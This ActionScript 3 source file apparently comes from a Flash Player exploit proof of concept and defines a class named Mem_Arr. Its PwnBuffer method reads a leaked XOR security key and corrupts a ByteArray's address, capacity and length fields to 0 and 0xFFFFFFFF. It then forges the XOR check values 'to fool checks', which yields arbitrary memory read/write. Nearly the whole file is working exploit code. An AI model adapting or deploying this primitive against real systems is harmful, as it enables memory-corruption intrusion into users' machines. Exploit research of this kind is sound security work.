package 
{
	import flash.utils.ByteArray;
	import com.adobe.tvsdk.mediacore.DRMOperationCompleteListener;
	/**
	 * ...
	 * @author xpn
	 */
	public class Mem_Arr extends ByteArray
	{
		var a1:uint = 0x31338;
		var a2:uint = 0x31338;
		var a3:uint = 0x31338;
		var a4:uint = 0x31338;
		var a5:uint = 0x31338;
		var a6:uint = 0x31338;
		var a7:uint = 0x31338;
		var a8:uint = 0x31338;
		var a9:uint = 0x31338;
		var a10:uint = 0x31338;
		var o1:Modify = new Modify(); 
		var a12:Object = 0x31338;
		var a13:Object = 0x31338;
		var a14:Object = 0x31338;
		var a15:Object = 0x31338;
		var a16:Object = 0x31338;

		public function Mem_Arr() 
		{
			
		}
		
		public function PwnBuffer(ref :Main) : void {
			
			// XOR key recovered from XOR of copyOnWrite property
			var xorkey = this.o1.a10;
			
			ref.AddToLog("XOR security key is " + xorkey.toString(16));
			
			// Update array addr, capacity, and length
			this.o1.a3 = 0;
			this.o1.a4 = 0xFFFFFFFF;
			this.o1.a5 = 0xFFFFFFFF;
			
			// Update XOR keys to fool checks
			this.o1.a7 = this.o1.a3 ^ xorkey;
			this.o1.a8 = this.o1.a4 ^ xorkey;
			this.o1.a9 = this.o1.a5 ^ xorkey;
		}
		
		public function RW() : void {
			this.o1.a1 = 0x31337;
		}
		
		public function Test() : void {
			trace("--> " + this.o1.a1.toString(16));
			trace("--> " + this.o1.a2.toString(16));
			trace("--> " + this.o1.a3.toString(16));
			trace("--> " + this.o1.a4.toString(16));
			trace("--> " + this.o1.a5.toString(16));
			trace("--> " + this.o1.a6.toString(16));
			trace("--> " + this.o1.a7.toString(16));
			trace("--> " + this.o1.a8.toString(16));
			trace("--> " + this.o1.a9.toString(16));
			trace("--> " + this.o1.a10.toString(16));
			trace("--> " + this.o1.a11.toString(16));
			trace("--> " + this.o1.a12.toString(16));
			trace("--> " + this.o1.a13.toString(16));
			trace("--> " + this.o1.a14.toString(16));
			trace("--> " + this.o1.a15.toString(16));
			trace("--> " + this.o1.a16.toString(16));
			trace("--> " + this.o1.a17.toString(16));
			trace("--> " + this.o1.a18.toString(16));
			trace("--> " + this.o1.a19.toString(16));
			trace("--> " + this.o1.a20.toString(16));
			trace("--> " + this.o1.a21.toString(16));
			trace("--> " + this.o1.a22.toString(16));
			trace("--> " + this.o1.a23.toString(16));
			trace("--> " + this.o1.a24.toString(16));
			trace("--> " + this.o1.a25.toString(16));
			trace("--> " + this.o1.a26.toString(16));
			trace("--> " + this.o1.a27.toString(16));
			trace("--> " + this.o1.a28.toString(16));
			trace("--> " + this.o1.a29.toString(16));
			trace("--> " + this.o1.a30.toString(16));
			trace("--> " + this.o1.a31.toString(16));
			trace("--> " + this.o1.a32.toString(16));
			trace("--> " + this.o1.a33.toString(16));
			trace("--> " + this.o1.a34.toString(16));
			trace("--> " + this.o1.a35.toString(16));
			trace("--> " + this.o1.a36.toString(16));
			
			this.o1.a1 = 0x31337;
		}
				
		
		public function onDRMOperationComplete():void {
			trace("IN COMPLETE");
		}
		
		public function onDRMError(major:uint, minor:uint, errorString:String, errorServerUrl:String):void {
			trace("IN ERROR");
		}
		
	}

}